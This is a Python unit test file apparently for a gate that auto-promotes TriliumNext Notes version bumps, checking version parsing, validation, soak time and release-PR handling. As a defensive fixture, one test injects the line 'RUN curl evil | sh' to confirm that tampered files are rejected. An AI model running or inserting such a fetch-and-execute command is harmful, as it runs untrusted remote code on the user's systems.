"""Regression checks for the fail-closed Trilium auto-promotion gates."""
import importlib.util
import unittest
from pathlib import Path
from unittest.mock import patch

path = Path(__file__).resolve().parents[1] / "scripts" / "auto_promote_trilium.py"
spec = importlib.util.spec_from_file_location("auto_promote_trilium", path)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

REPO = "x/y"
NOW = 1_800_000_000.0
APP = "TriliumNext Notes"
STABLE = {
    f"{APP}/Dockerfile": "FROM docker.io/triliumnext/trilium:v0.106.0\n\nARG BUILD_VERSION\n",
    f"{APP}/config.yaml": '---\nname: "Trilium Notes"\nversion: "v2026.10.18"\ndescription: >-\n'
                          "  Trilium v0.106.0 - hierarchical note-taking and personal knowledge base.\n",
    f"{APP}/README.md": "# Trilium Notes\n\n[![Trilium version](https://img.shields.io/badge/"
                        "Trilium-v0.106.0-6E56CF)](https://github.com/TriliumNext/Trilium/"
                        "releases/tag/v0.106.0)\n",
    f"{APP}/CHANGELOG.md": "# Changelog\n\n## v2026.10.18\n\n### Fixed\n\n- Earlier.\n",
}


def bumped(**overrides):
    files = {name: text.replace("v0.106.0", "v0.106.2").replace("v2026.10.18", "v2026.10.24.1")
             for name, text in STABLE.items()}
    files[f"{APP}/CHANGELOG.md"] = (
        "# Changelog\n\n## v2026.10.24.1\n\n### Changed\n\n"
        "- Updated Trilium from v0.106.1 to v0.106.2.\n\n"
        "## v2026.10.24\n\n### Changed\n\n- Updated Trilium from v0.106.0 to v0.106.1.\n\n"
        + STABLE[f"{APP}/CHANGELOG.md"][len("# Changelog\n\n"):]
    )
    files.update(overrides)
    return files


class ContentTests(unittest.TestCase):
    def test_accepts_pure_version_bumps(self):
        self.assertEqual(mod.check_content(STABLE, bumped()), ("v0.106.0", "v0.106.2"))

    def test_rejects_any_other_change(self):
        for name in (f"{APP}/Dockerfile", f"{APP}/config.yaml", f"{APP}/README.md"):
            with self.subTest(file=name), self.assertRaisesRegex(ValueError, "more than"):
                mod.check_content(STABLE, bumped(**{name: bumped()[name] + "RUN curl evil | sh\n"}))

    def test_rejects_changelog_edits(self):
        notes = bumped()[f"{APP}/CHANGELOG.md"]
        for text in (notes.replace("- Earlier.", "- Rewritten."),
                     notes.replace("v0.106.2.\n", "v0.106.2.\n- Also something manual.\n", 1)):
            with self.subTest(text=text[:60]), self.assertRaises(ValueError):
                mod.check_content(STABLE, bumped(**{f"{APP}/CHANGELOG.md": text}))

    def test_rejects_downgrade_and_unchanged_app_version(self):
        with self.assertRaisesRegex(ValueError, "Trilium version"):
            mod.check_content(bumped(), STABLE)
        same = {name: text.replace("v2026.10.24.1", "v2026.10.18") for name, text in bumped().items()}
        with self.assertRaisesRegex(ValueError, "App version"):
            mod.check_content(STABLE, same)

    def test_major_update_stays_manual(self):
        files = {name: text.replace("v0.106.2", "v1.0.0") for name, text in bumped().items()}
        with self.assertRaisesRegex(mod.Skip, "Major"):
            mod.check_content(STABLE, files)

    def test_minor_update_is_automatic(self):
        files = {name: text.replace("v0.106.2", "v0.107.0") for name, text in bumped().items()}
        self.assertEqual(mod.check_content(STABLE, files)[1], "v0.107.0")


class GateTests(unittest.TestCase):
    def run_gate(self, states, haos=False, newest=NOW - 49 * 3600):
        with patch.object(mod, "git") as git, \
             patch.object(mod.shared, "check_history", return_value=newest), \
             patch.object(mod, "show", side_effect=lambda sha, name: (STABLE if sha == "m" else bumped())[name]), \
             patch.object(mod.shared, "check_release"), \
             patch.object(mod, "api", return_value={}), \
             patch.object(mod, "ci_state", side_effect=lambda repo, workflow, _: states[workflow]):
            git.side_effect = lambda *a: {
                ("rev-parse", "origin/main"): "m", ("rev-parse", "origin/dev-trilium"): "d",
                ("diff", "--name-only", "m", "d"): "\n".join(mod.ALLOWED_FILES),
            }.get(a, "")
            return mod.gate(REPO, NOW, haos)

    def test_validation_is_mandatory(self):
        self.assertEqual(self.run_gate({"validate.yml": "missing"})["action"], "validate")
        self.assertEqual(self.run_gate({"validate.yml": "running"})["action"], "wait")
        with self.assertRaisesRegex(ValueError, "validation failed"):
            self.run_gate({"validate.yml": "failed"})
        self.assertEqual(self.run_gate({"validate.yml": "success"})["action"], "promote")

    def test_soak_of_48_hours(self):
        with self.assertRaisesRegex(mod.Skip, "36 hours"):
            self.run_gate({"validate.yml": "success"}, newest=NOW - 35 * 3600)

    def test_haos_gate_keeps_release_manual(self):
        with self.assertRaisesRegex(mod.Skip, "HAOS"):
            self.run_gate({"validate.yml": "success"}, haos=True)


class ReleasePrTests(unittest.TestCase):
    pr = {"head": {"ref": "dev-trilium", "sha": "d", "repo": {"full_name": REPO}},
          "draft": False, "labels": [], "number": 7}

    def test_hold_and_stale_heads_are_never_merged(self):
        cases = ({"labels": [{"name": "hold"}]}, {"draft": True},
                 {"head": {"ref": "dev-trilium", "sha": "old", "repo": {"full_name": REPO}}})
        for change in cases:
            with self.subTest(change=change), \
                 patch.object(mod, "api", return_value=[{**self.pr, **change}]), \
                 self.assertRaises(mod.Skip):
                mod.release_pr(REPO, "d")

    def test_existing_release_pr_is_reused(self):
        with patch.object(mod, "api", return_value=[self.pr]):
            self.assertEqual(mod.release_pr(REPO, "d")["number"], 7)


if __name__ == "__main__":
    unittest.main()
